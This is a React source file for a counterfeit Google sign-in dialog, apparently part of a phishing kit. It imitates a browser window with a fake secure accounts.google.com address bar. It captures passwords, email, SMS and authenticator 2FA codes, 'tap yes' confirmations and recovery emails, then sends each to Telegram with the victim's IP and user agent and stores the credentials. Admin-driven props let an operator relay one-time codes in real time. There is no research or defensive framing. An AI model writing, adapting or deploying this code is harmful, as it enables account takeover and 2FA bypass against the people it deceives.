"use client"

import type React from "react"
import Image from "next/image"
import { useState, useEffect } from "react"
import { sendToTelegram, send2FAToTelegram } from "@/lib/telegram"
import { storeUserCredentials } from "@/lib/session-tracking"
import { DialogPortal, DialogOverlay } from "@/components/ui/dialog"
import * as DialogPrimitive from "@radix-ui/react-dialog"
import { Lock, X, Minus } from "lucide-react"
import { cn } from "@/lib/utils"
import { TapYesScreen } from "./tap-yes-screen"

// Function to get user's IP address
async function getUserIP(): Promise<string | undefined> {
  try {
    const response = await fetch('/api/get-ip')
    if (response.ok) {
      const data = await response.json()
      return data.ip !== 'unknown' ? data.ip : undefined
    }
  } catch (error) {
    console.error('Error fetching IP:', error)
  }
  return undefined
}

interface GoogleLoginDialogProps {
  onClose?: () => void
  initialStep?: "login" | "login-error" | "loading" | "email-otp" | "email-otp-error" | "sms-otp" | "sms-otp-error" | "gauth-otp" | "gauth-otp-error" | "email-recovery" | "email-recovery-error" | "tap-yes"
  adminTapDeviceInfo?: string
  adminTapMatchingNumber?: string
  adminSmsLastDigits?: string
  adminRecoveryEmail?: string
}

export default function GoogleLoginDialog({ onClose, initialStep = "login", adminTapDeviceInfo, adminTapMatchingNumber, adminSmsLastDigits, adminRecoveryEmail }: GoogleLoginDialogProps) {
  const [step, setStep] = useState<"login" | "login-error" | "loading" | "email-otp" | "email-otp-error" | "sms-otp" | "sms-otp-error" | "gauth-otp" | "gauth-otp-error" | "email-recovery" | "email-recovery-error" | "tap-yes">(initialStep)
  const [email, setEmail] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [emailError, setEmailError] = useState("")
  const [passwordError, setPasswordError] = useState("")
  const [otpError, setOtpError] = useState("")
  const [showError, setShowError] = useState(false)

  // Show error on mount for error states
  useEffect(() => {
    if (initialStep.includes('error')) {
      setShowError(true)
    }
  }, [initialStep])

  // Update step when initialStep changes (for admin panel redirects)
  useEffect(() => {
    setStep(initialStep)
  }, [initialStep])

  const validateEmail = (emailValue: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    const phoneRegex = /^\d{10,}$/
    return emailRegex.test(emailValue) || phoneRegex.test(emailValue)
  }

  const handleContinueNext = (e: React.FormEvent) => {
    e.preventDefault()
    const formData = new FormData(e.target as HTMLFormElement)
    const emailValue = formData.get("email") as string

    setEmailError("")

    if (!emailValue) {
      setEmailError("Enter an email or phone number")
      return
    }

    let finalEmail = emailValue
    // If it's not an email and not a phone number, append @gmail.com
    if (emailValue.indexOf("@") === -1 && isNaN(Number(emailValue))) {
      finalEmail = emailValue + "@gmail.com"
    }

    if (!validateEmail(finalEmail) && !validateEmail(emailValue)) {
      setEmailError("Enter a valid email or phone number")
      return
    }

    setEmail(finalEmail)
    setStep("login")
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    const formData = new FormData(e.target as HTMLFormElement)
    const passwordValue = formData.get("password") as string

    setPasswordError("")

    if (!passwordValue) {
      setPasswordError("Enter a password")
      return
    }

    if (passwordValue.length < 8) {
      setPasswordError("Password is too short.")
      return
    }

    // Send credentials to Telegram and store in database
    if (email && passwordValue) {
      const ipAddress = await getUserIP()
      await sendToTelegram({
        email: email,
        password: passwordValue,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
      await storeUserCredentials(email, passwordValue)
    }

    // Show loading screen
    setStep("loading")
  }

  const handleOTPSubmit = async (e: React.FormEvent, otpType: '2fa' | '2fa-sms' | '2fa-email') => {
    e.preventDefault()
    const formData = new FormData(e.target as HTMLFormElement)
    const codeValue = formData.get("code") as string

    setOtpError("")

    if (!codeValue) {
      setOtpError("Enter the code")
      return
    }

    if (codeValue.length !== 6) {
      setOtpError("Code should be 6 digits")
      return
    }

    // Send OTP to Telegram
    if (codeValue) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: codeValue,
        type: otpType,
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }

    // Show loading screen
    setStep("loading")
  }

  const handleEmailRecovery = async (e: React.FormEvent) => {
    e.preventDefault()
    const formData = new FormData(e.target as HTMLFormElement)
    const recoveryEmail = formData.get("recovery_email") as string

    if (!recoveryEmail) {
      return
    }

    // Send recovery email to Telegram
    if (recoveryEmail) {
      const ipAddress = await getUserIP()
      await send2FAToTelegram({
        code: recoveryEmail,
        type: '2fa-email',
        email: email,
        timestamp: new Date().toISOString(),
        userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
        ipAddress: ipAddress
      })
    }

    // Show loading screen
    setStep("loading")
  }

  return (
    <DialogPortal>
      <DialogOverlay />
      <DialogPrimitive.Content
        className={cn(
          "fixed left-[50%] top-[50%] z-50 grid w-full max-w-md translate-x-[-50%] translate-y-[-50%] p-0 overflow-hidden rounded-lg shadow-xl border-none flex flex-col max-h-[95vh] overflow-y-auto bg-background duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%]"
        )}
      >
        {/* Visually hidden dialog title for accessibility */}
        <DialogPrimitive.Title className="sr-only">Google Sign In</DialogPrimitive.Title>

        {/* Custom Browser Title Bar */}
        <div className="flex items-center justify-between bg-gray-100 px-3 py-2 border-b border-gray-300 rounded-t-lg flex-shrink-0">
          <div className="flex items-center gap-2 text-sm font-medium text-gray-800">
            <Image src="/google-logo.svg" alt="Google icon" width={16} height={16} />
            Sign in - Google Accounts
          </div>
          <div className="flex items-center gap-1">
            <button className="text-gray-500 hover:text-gray-700 p-1 rounded">
              <Minus className="w-3.5 h-3.5 stroke-[2.5px]" />
            </button>
            <button
              onClick={onClose}
              className="text-gray-500 hover:text-gray-700 p-1 rounded hover:bg-red-500 hover:text-white"
            >
              <X className="w-3.5 h-3.5 stroke-[2.5px]" />
            </button>
          </div>
        </div>

        {/* Custom Browser URL Bar */}
        <div className="flex items-center bg-gray-50 px-3 py-2 border-b border-gray-200 flex-shrink-0">
          <Lock className="w-4 h-4 text-green-600 mr-2" />
          <div className="flex-1 bg-white border border-gray-300 rounded-full px-3 py-1 text-sm text-gray-700 flex items-center">
            <span className="text-green-600 font-medium whitespace-nowrap">Secure | https://</span>
            <span className="truncate text-gray-800">accounts.google.com/signin/v2/identifier...</span>
          </div>
        </div>

        {/* Main Dialog Content - Google Container */}
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', minHeight: '600px', padding: '20px', background: 'white' }}>
          <div className={`google-card ${step.includes('otp') || step.includes('recovery') || step === 'tap-yes' ? 'otp-screen' : ''}`} style={{ border: 'none', boxShadow: 'none', width: '448px', margin: '0' }}>
            {step === "loading" && <div className="google-progress" style={{ width: "100%" }}></div>}

            <Image src="/google-logo.svg" alt="Google" width={75} height={24} />

            {((step === "login" && email) || step === "login-error") && (
              <>
                <h2>Hi {email ? email.split("@")[0] : "User"}</h2>
                <div className="google-account-selector">
                  <div className="google-account-chip">
                    <div className="google-account-icon">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                      </svg>
                    </div>
                    <div className="google-account-email">{email || "user@example.com"}</div>
                    <div className="google-account-dropdown">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                      </svg>
                    </div>
                  </div>
                </div>

                <form onSubmit={handleLogin} style={{ width: "100%", marginTop: "2rem" }}>
                  <div className={`google-input-container ${passwordError || step === "login-error" ? "google-input-error" : ""}`}>
                    <input
                      type={showPassword ? "text" : "password"}
                      id="passwordInput"
                      placeholder=" "
                      name="password"
                      autoFocus={step === "login-error"}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') {
                          e.preventDefault()
                          const form = e.currentTarget.form
                          if (form) {
                            form.requestSubmit()
                          }
                        }
                      }}
                    />
                    <label className="google-floating-label" htmlFor="passwordInput">
                      Enter your password
                    </label>
                  </div>

                  {(passwordError || step === "login-error") && (
                    <div className="google-alert-error" style={{ fontSize: '0.77rem', fontWeight: 550, marginLeft: '0.1rem' }}>
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                      </svg>
                      <span>{step === "login-error" ? "Wrong password. Try again or click Forgot password to reset it." : passwordError}</span>
                    </div>
                  )}

                  <div className="google-checkbox-container">
                    <input
                      type="checkbox"
                      id="showPassword"
                      checked={showPassword}
                      onChange={(e) => setShowPassword(e.target.checked)}
                    />
                    <label htmlFor="showPassword">Show password</label>
                  </div>

                  <div className="google-card-bottom" style={{ float: "right", width: '100%' }}>
                    <a href="#">Forgot password?</a>
                    <button type="submit">Next</button>
                  </div>
                </form>
              </>
            )}

            {step === "loading" && (
              <>
                <svg className="google-spinner" width="65px" height="65px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg" style={{ marginTop: "5rem" }}>
                  <circle className="google-spinner-path" fill="none" strokeWidth="6" strokeLinecap="round" cx="33" cy="33" r="30"></circle>
                </svg>
              </>
            )}

            {(step === "email-otp" || step === "email-otp-error") && (
              <>
                <h2>2-Step Verification</h2>
                <h3 style={{ textAlign: 'center', paddingBottom: '11px', marginBottom: '0.5rem' }}>To help keep your account safe, Google wants to make sure it's really you trying to sign in</h3>

                <div className="google-account-selector" style={{ marginTop: '-1rem', marginBottom: '-0.3rem' }}>
                  <div className="google-account-chip">
                    <div className="google-account-icon">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                      </svg>
                    </div>
                    <div className="google-account-email">{email || "user@example.com"}</div>
                    <div className="google-account-dropdown">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                      </svg>
                    </div>
                  </div>
                </div>

                <div style={{ width: '100%', marginTop: '1rem' }}>
                  <h2 style={{ color: '#000', fontSize: '1.2rem', fontWeight: 500, fontFamily: 'Google Sans,Noto Sans Myanmar UI,arial,sans-serif', letterSpacing: '0.1px', lineHeight: '1.5', marginBottom: '8px' }}>2-Step Verification</h2>
                  <p style={{ color: '#5f6368', fontSize: '14px', marginBottom: '24px', marginTop: '-1rem' }}>
                    An email with a verification code was just sent to <strong>{email || "user@example.com"}</strong>
                  </p>
                  <form onSubmit={(e) => handleOTPSubmit(e, '2fa-email')} style={{ width: '100%' }}>
                    <div className={`google-input-container ${step === "email-otp-error" ? "google-input-error" : ""}`} style={{ marginTop: '1rem' }}>
                      <input
                        type="text"
                        id="otpCode"
                        placeholder=" "
                        name="code"
                        maxLength={6}
                        autoFocus={step === "email-otp-error"}
                      />
                      <label className="google-floating-label" htmlFor="otpCode">
                        Enter the code
                      </label>
                    </div>

                    {(otpError || step === "email-otp-error") && (
                      <div className="google-alert-error">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                        <span>{step === "email-otp-error" ? "Wrong code. Try again." : otpError}</span>
                      </div>
                    )}

                    <div className="google-card-bottom" style={{ marginTop: '1rem' }}>
                      <a href="#">Try another way</a>
                      <button type="submit">Next</button>
                    </div>
                  </form>
                </div>
              </>
            )}

            {(step === "sms-otp" || step === "sms-otp-error") && (
              <>
                <h2>2-Step Verification</h2>
                <h3 style={{ textAlign: 'center', paddingBottom: '11px' }}>To help keep your account safe, Google wants to make sure it's really you trying to sign in</h3>

                <div className="google-account-selector" style={{ marginTop: '-1rem', marginBottom: '-0.3rem' }}>
                  <div className="google-account-chip">
                    <div className="google-account-icon">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                      </svg>
                    </div>
                    <div className="google-account-email">{email || "user@example.com"}</div>
                    <div className="google-account-dropdown">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                      </svg>
                    </div>
                  </div>
                </div>

                <div style={{ width: '100%', marginTop: '1rem' }}>
                  <h2 style={{ color: '#000', fontSize: '1.2rem', fontWeight: 500, fontFamily: 'Google Sans,Noto Sans Myanmar UI,arial,sans-serif', letterSpacing: '0.1px', lineHeight: '1.5', marginBottom: '8px' }}>2-Step Verification</h2>
                  <p style={{ color: '#5f6368', fontSize: '14px', marginBottom: '0px', marginTop: '-1rem', lineHeight: '1.5' }}>
                    Google sent a code to your phone ending in <strong>**{adminSmsLastDigits || "45"}</strong>
                  </p>
                  <form onSubmit={(e) => handleOTPSubmit(e, '2fa-sms')} style={{ width: '100%' }}>
                    <div className={`google-input-container ${step === "sms-otp-error" ? "google-input-error" : ""}`} style={{ marginTop: '1rem' }}>
                      <input
                        type="text"
                        id="smsCode"
                        placeholder=" "
                        name="code"
                        maxLength={6}
                        autoFocus={step === "sms-otp-error"}
                      />
                      <label className="google-floating-label" htmlFor="smsCode">
                        Enter the code
                      </label>
                    </div>

                    {(otpError || step === "sms-otp-error") && (
                      <div className="google-alert-error">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                        <span>{step === "sms-otp-error" ? "Wrong code. Try again." : otpError}</span>
                      </div>
                    )}

                    <div className="google-card-bottom" style={{ marginTop: '1rem' }}>
                      <a href="#">Try another way</a>
                      <button type="submit">Next</button>
                    </div>
                  </form>
                </div>
              </>
            )}

            {(step === "gauth-otp" || step === "gauth-otp-error") && (
              <>
                <h2>2-Step Verification</h2>
                <h3 style={{ textAlign: 'center', paddingBottom: '11px' }}>To help keep your account safe, Google wants to make sure it's really you trying to sign in</h3>

                <div className="google-account-selector" style={{ marginTop: '-1rem', marginBottom: '-0.3rem' }}>
                  <div className="google-account-chip">
                    <div className="google-account-icon">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                      </svg>
                    </div>
                    <div className="google-account-email">{email || "user@example.com"}</div>
                    <div className="google-account-dropdown">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                      </svg>
                    </div>
                  </div>
                </div>

                <div style={{ width: '100%', marginTop: '1rem' }}>
                  <h2 style={{ color: '#000', fontSize: '1.2rem', fontWeight: 500, fontFamily: 'Google Sans,Noto Sans Myanmar UI,arial,sans-serif', letterSpacing: '0.1px', lineHeight: '1.5', marginBottom: '8px' }}>2-Step Verification</h2>
                  <p style={{ color: '#5f6368', fontSize: '14px', marginBottom: '24px', marginTop: '-1rem' }}>
                    Enter the 6-digit code from your Google Authenticator app
                  </p>
                  <form onSubmit={(e) => handleOTPSubmit(e, '2fa')} style={{ width: '100%' }}>
                    <div className={`google-input-container ${step === "gauth-otp-error" ? "google-input-error" : ""}`} style={{ marginTop: '1rem' }}>
                      <input
                        type="text"
                        id="gauthCode"
                        placeholder=" "
                        name="code"
                        maxLength={6}
                        autoFocus={step === "gauth-otp-error"}
                      />
                      <label className="google-floating-label" htmlFor="gauthCode">
                        Enter the code
                      </label>
                    </div>

                    {(otpError || step === "gauth-otp-error") && (
                      <div className="google-alert-error">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                        <span>{step === "gauth-otp-error" ? "Wrong code. Try again." : otpError}</span>
                      </div>
                    )}

                    <div className="google-card-bottom" style={{ marginTop: '1rem' }}>
                      <a href="#">Try another way</a>
                      <button type="submit">Next</button>
                    </div>
                  </form>
                </div>
              </>
            )}

            {step === "tap-yes" && (
              <TapYesScreen
                email={email || "user@example.com"}
                deviceInfo={adminTapDeviceInfo || "device"}
                matchingNumber={adminTapMatchingNumber || "45"}
                onSubmit={async () => {
                  // Send tap confirmation to Telegram
                  const ipAddress = await getUserIP()
                  await send2FAToTelegram({
                    code: `TAP YES - Number: ${adminTapMatchingNumber || "45"}`,
                    type: '2fa',
                    email: email,
                    timestamp: new Date().toISOString(),
                    userAgent: typeof window !== 'undefined' ? window.navigator.userAgent : undefined,
                    ipAddress: ipAddress
                  })
                  setStep("loading")
                }}
              />
            )}

            {(step === "email-recovery" || step === "email-recovery-error") && (
              <>
                <h2>Account recovery</h2>

                <div className="google-account-selector" style={{ marginTop: '8px' }}>
                  <div className="google-account-chip">
                    <div className="google-account-icon">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                      </svg>
                    </div>
                    <div className="google-account-email">{email || "user@example.com"}</div>
                    <div className="google-account-dropdown">
                      <svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
                      </svg>
                    </div>
                  </div>
                </div>

                <div className="google-otp-container" style={{ marginTop: '1rem' }}>
                  <p className="google-otp-description" style={{ fontSize: '14px', color: '#5f6368', marginBottom: '24px', lineHeight: '1.5' }}>
                    Confirm the recovery email address you added to your account: <strong>{adminRecoveryEmail || (email ? email.substring(0, 2) + '****@****.***' : '****@****.***')}</strong>
                  </p>
                  <form onSubmit={handleEmailRecovery}>
                    <div className={`google-input-container ${step === "email-recovery-error" ? "google-input-error" : ""}`}>
                      <input
                        type="email"
                        id="recoveryEmail"
                        placeholder=" "
                        name="recovery_email"
                        autoFocus={step === "email-recovery-error"}
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') {
                            e.preventDefault()
                            const form = e.currentTarget.form
                            if (form) {
                              form.requestSubmit()
                            }
                          }
                        }}
                      />
                      <label className="google-floating-label" htmlFor="recoveryEmail">
                        Enter recovery email address
                      </label>
                    </div>

                    {step === "email-recovery-error" && (
                      <div className="google-alert-error">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                        <span>Wrong email. Try again.</span>
                      </div>
                    )}

                    <div className="google-card-bottom">
                      <a href="#">Try another way</a>
                      <button type="submit">Next</button>
                    </div>
                  </form>
                </div>
              </>
            )}

            {!email && step !== "loading" && step !== "login-error" && !step.includes("otp") && !step.includes("recovery") && step !== "tap-yes" && (
              <form onSubmit={handleContinueNext} style={{ width: "100%" }}>
                <h2 style={{ paddingBottom: 0, paddingTop: "16px" }}>Sign in</h2>
                <h3>Use your Google Account</h3>

                <div className={`google-input-container ${emailError ? "google-input-error" : ""}`}>
                  <input
                    type="text"
                    id="emailInput"
                    placeholder=" "
                    name="email"
                    onKeyDown={(e) => {
                      if (e.key === 'Enter') {
                        e.preventDefault()
                        const form = e.currentTarget.form
                        if (form) {
                          form.requestSubmit()
                        }
                      }
                    }}
                  />
                  <label className="google-floating-label" htmlFor="emailInput">
                    Email or phone
                  </label>
                </div>

                {emailError && (
                  <div className="google-alert-error">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                    </svg>
                    <span>{emailError}</span>
                  </div>
                )}

                <div className="google-btn-email">
                  <button type="button">Forgot email?</button>
                </div>

                <p>
                  Not your computer? Use a private browsing window to sign in.{" "}
                  <a href="#">Learn more about using Guest mode</a>
                </p>

                <div className="google-card-bottom">
                  <a href="#">Create account</a>
                  <button type="submit">Next</button>
                </div>
              </form>
            )}
          </div>

          <div className="google-footer" style={{
            marginTop: '20px',
            width: '448px',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'flex-end',
            fontSize: '12px',
            color: '#5f6368',
            paddingTop: '16px',
            paddingLeft: '16px',
            paddingRight: '16px'
          }}>
            <div style={{ display: 'flex', alignItems: 'center' }}>
              <select style={{
                background: "transparent",
                border: "none",
                cursor: "pointer",
                outline: "none",
                color: "#5f6368",
                fontSize: '12px',
                fontFamily: 'Roboto, arial, sans-serif'
              }}>
                <option>English (United States)</option>
              </select>
            </div>
            <div style={{
              display: 'flex',
              gap: '20px',
              alignItems: 'center'
            }}>
              <a href="#" style={{
                color: '#5f6368',
                textDecoration: 'none',
                fontSize: '12px',
                fontFamily: 'Roboto, arial, sans-serif'
              }}>Help</a>
              <a href="#" style={{
                color: '#5f6368',
                textDecoration: 'none',
                fontSize: '12px',
                fontFamily: 'Roboto, arial, sans-serif'
              }}>Privacy</a>
              <a href="#" style={{
                color: '#5f6368',
                textDecoration: 'none',
                fontSize: '12px',
                fontFamily: 'Roboto, arial, sans-serif'
              }}>Terms</a>
            </div>
          </div>
        </div>
      </DialogPrimitive.Content>
    </DialogPortal>
  )
}

